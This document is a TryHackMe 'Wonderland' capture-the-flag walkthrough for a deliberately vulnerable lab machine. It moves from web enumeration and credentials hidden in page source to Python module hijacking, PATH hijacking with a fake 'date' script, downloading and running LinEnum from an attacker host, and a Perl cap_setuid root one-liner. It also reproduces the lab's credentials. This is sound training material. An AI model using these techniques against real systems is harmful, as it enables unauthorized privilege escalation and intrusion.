# 🐇 TryHackMe: Wonderland Write-Up

A complete walkthrough of the **Wonderland** room on TryHackMe. This room focuses on web enumeration, hidden credentials, Python module hijacking, PATH hijacking, Linux capabilities abuse, and privilege escalation.

Link:https://tryhackme.com/room/wonderland

---

## 📌 Room Information

| Room | Wonderland |
|--------|--------|
| Platform | TryHackMe |
| Difficulty | Medium |

---

## 🎯 Objective

- Gain initial access to the target machine.
- Capture the user flag.
- Escalate privileges through multiple users.
- Obtain root access and capture the root flag.

---

# 🔍 Step 1: Initial Enumeration

The first step is always to identify open ports and running services.

```bash
nmap -sC -sV <TARGET_IP>
```

### Why?

- `-sC` runs default Nmap scripts.
- `-sV` identifies service versions.
- Helps discover potential entry points.

### Results

```text
22/tcp open  ssh
80/tcp open  http
```

The target is running:

- SSH on Port 22
- HTTP on Port 80

Since we do not have SSH credentials, the web server becomes the primary target.

---

# 🌐 Step 2: Exploring the Website

Opening the target IP in a browser reveals a simple webpage containing a clue:

> Follow the White Rabbit

There are no obvious vulnerabilities visible on the page, so further enumeration is required.

---

# 📂 Step 3: Directory Enumeration

To discover hidden content, I used Dirb.

```bash
gobuster dir -u http://<Target_ip> -w /usr/share/wordlists/dirb/common.txt
```


### Results

```text
/img                  (Status: 301) [Size: 0] [--> img/]
/index.html           (Status: 301) [Size: 0] [--> ./]
/r                    (Status: 301) [Size: 0] [--> r/]
```

A hidden directory named `/r/` was discovered.

---

/img directory containing three image files:

```text
alice_door.jpg
alice_door.png
white_rabbit_1.jpg
```

Downloaded images from /img and ran steghide.

```text
┌──(kali㉿kali)-[~/Downloads]
└─$ steghide extract -sf alice_door.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ steghide extract -sf alice_door.png 
Enter passphrase: 
steghide: the file format of the file "alice_door.png" is not supported.
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ steghide extract -sf white_rabbit_1.jpg 
Enter passphrase: 
the file "hint.txt" does already exist. overwrite ? (y/n) y
wrote extracted data to "hint.txt".
```
One image (white_rabbit_1.jpg) contained a hidden clue:
cat hint.txt
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ cat hint.txt 
follow the r a b b i t
```

# 🐰 Step 4: Following the Rabbit

Opening `/r/` revealed another clue.

Following the Wonderland theme, I manually explored deeper directories and discovered:

```text
/r/
/r/a/
/r/a/b/
/r/a/b/b/
/r/a/b/b/i/
/r/a/b/b/i/t/
```

This spells:

```text
rabbit
```

The final page displayed a message encouraging further investigation.

---

# 🔎 Step 5: Inspecting the Source Code

The webpage itself did not reveal anything useful, so I inspected the page source.

```text
view-source:http://<TARGET_IP>/r/a/b/b/i/t/
```


### Results

Hidden SSH credentials were discovered:

```text
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

The credentials were hidden using CSS styling and were not visible during normal browsing.

---

# 🔐 Step 6: Initial Access as Alice

Using the discovered credentials, I connected through SSH.

```bash
ssh alice@<TARGET_IP>
```

After successful authentication, I checked the contents of Alice's home directory.

```bash
ls -la
```

### Results

```text
root.txt
walrus_and_the_carpenter.py
```

---

# 🚩 Step 7: Capturing the User Flag

Naturally, I attempted to read `root.txt`.

```bash
cat root.txt
```

However, access was denied.

This is where Wonderland introduces a clever twist.

### Flag Swap

The room intentionally swaps the flag locations:

| Expected Location | Actual Content |
|------------------|---------------|
| root.txt | Root Flag |
| /root/user.txt | User Flag |

Reading the user flag:

```bash
cat /root/user.txt
```

✅ User Flag Captured

---

# 🐍 Step 8: Analyzing the Python Script

Next, I inspected the Python script found in Alice's home directory.

```bash
cat walrus_and_the_carpenter.py
```

Inside the script, I noticed:

```python
import random
```

This immediately stood out.



---

# 🔍 Step 9: Checking Sudo Permissions

I checked which commands Alice could run as another user.

```bash
sudo -l
```

### Results

```text
User alice may run the following commands:

(rabbit) NOPASSWD:
/usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Alice can execute the script as the user **rabbit**.

---

# 🐇 Step 10: Privilege Escalation to Rabbit

Here we notice that the Python file imports the random library. To exploit this, we create our own random.py in the same directory. When the script runs, Python will import our malicious random.py instead of the system library, allowing us to gain control.
To exploit the import vulnerability, I created a fake Python module named random.py.

```bash
nano random.py
```

Contents:

```python
import os
os.system("/bin/bash")
```

### Why does this work?

When the script imports `random`, Python loads my malicious module instead of the legitimate one.

Running the allowed sudo command:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

### Result

A shell was spawned as:

```text
rabbit@wonderland:~$
```

✅ Privilege Escalation Successful

---

# ☕ Step 11: Enumerating Rabbit

After gaining access as Rabbit, I explored the user's home directory.

```bash
cd /home/rabbit
ls -la
```

### Results

```text
teaParty
```

An interesting executable named `teaParty` was discovered.

Running it produced an unusual message referencing the Mad Hatter.

```bash
./teaParty
```

---

# 🔬 Step 12: Analyzing the teaParty Binary

To better understand the binary, I transferred it to my Kali machine.

### On Target

```bash
python3 -m http.server
```

### On Kali

```bash
wget http://<TARGET_IP>:8000/teaParty
```

Using the `strings` command:

```bash
strings teaParty
```

### Interesting Output

```text
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

A critical issue becomes visible.

The binary executes:

```text
date
```

without specifying the full path.

---

# 🎩 Step 13: PATH Hijacking to Become Hatter

Since the binary calls `date` without using `/bin/date`, it becomes vulnerable to PATH hijacking.

### Why does PATH Hijacking work?

Linux searches directories listed in the PATH variable from left to right.

If a malicious executable appears before the legitimate command, Linux executes the malicious version first.

---

### Create a Fake date Command

```bash
nano date
```

Contents:

```bash
#!/bin/bash
/bin/bash
```

Make it executable:

```bash
chmod +x date
```

Add the current directory to the beginning of PATH:

```bash
export PATH=/home/rabbit:$PATH
```

Run the vulnerable binary again:

```bash
./teaParty
```

### Result

A shell was obtained as:

```text
hatter@wonderland
```

✅ Privilege Escalation Successful

---

# 🔑 Step 14: Enumerating Hatter

Inside Hatter's home directory, I found a password file.

```bash
cd /home/hatter
ls
```

Output:

```text
password.txt
```

Reading the file:

```bash
cat password.txt
```

Output:

```text
WhyIsARavenLikeAWritingDesk?
```

Although interesting, this password was not required for the final privilege escalation.

---

# 🛠️ Step 15: System Enumeration

At this point, further enumeration was required.

I uploaded LinEnum to search for common privilege escalation vectors.

```bash
wget http://<KALI_IP>:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### Why?

Enumeration is one of the most important phases of privilege escalation.

LinEnum automatically checks:

- SUID binaries
- Capabilities
- Writable files
- Misconfigurations
- Scheduled tasks

---

# 🚨 Step 16: Discovering Dangerous Capabilities

LinEnum revealed an interesting finding.

To verify manually:

```bash
getcap -r / 2>/dev/null
```

Output:

```text
/usr/bin/perl = cap_setuid+ep
```

---

# 📖 Step 17: Researching GTFOBins

After discovering the Perl capability, I checked GTFOBins for known abuse techniques.

### Why?

GTFOBins is a trusted resource containing privilege escalation techniques for Linux binaries.

The site provided a method to abuse Perl's `cap_setuid` capability.

---

# 👑 Step 18: Privilege Escalation to Root

Using the GTFOBins technique:

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

Verify access:

```bash
id
```

Output:

```text
root
```

✅ Root Access Obtained

---

# 🚩 Step 19: Capturing the Root Flag

Now that root access was obtained, I returned to Alice's directory and read the root flag.

```bash
cat /home/alice/root.txt
```

✅ Root Flag Captured

---

# 🛠️ Tools Used

- Nmap
- Gobuster
- SSH
- Python
- Strings
- LinEnum
- GTFOBins

---

# 📚 Skills Practiced

- Network Enumeration
- Web Enumeration
- Directory Bruteforcing
- Source Code Inspection
- SSH Authentication
- Python Module Hijacking
- Linux Enumeration
- Binary Analysis
- PATH Hijacking
- Linux Capabilities Abuse
- Privilege Escalation

---

# 🎓 Lessons Learned

This room demonstrates several real-world attack techniques:

- Hidden information is often revealed through source code inspection.
- Thorough enumeration is critical during every phase of a penetration test.
- Python's module search order can lead to module hijacking vulnerabilities.
- Improper use of environment variables can introduce PATH hijacking vulnerabilities.
- Linux capabilities can be as dangerous as SUID binaries when misconfigured.
- GTFOBins is an excellent resource for privilege escalation research.

---

# 🏁 Conclusion

Wonderland is an excellent medium-level room that combines multiple privilege escalation techniques into a single attack path.

The room begins with web enumeration and hidden credentials, then progresses through Python module hijacking, PATH hijacking, and Linux capability abuse before finally achieving root access.

It provides valuable hands-on experience with common Linux privilege escalation techniques that penetration testers frequently encounter during real-world assessments and CTF environments.

Machine Completed ✅
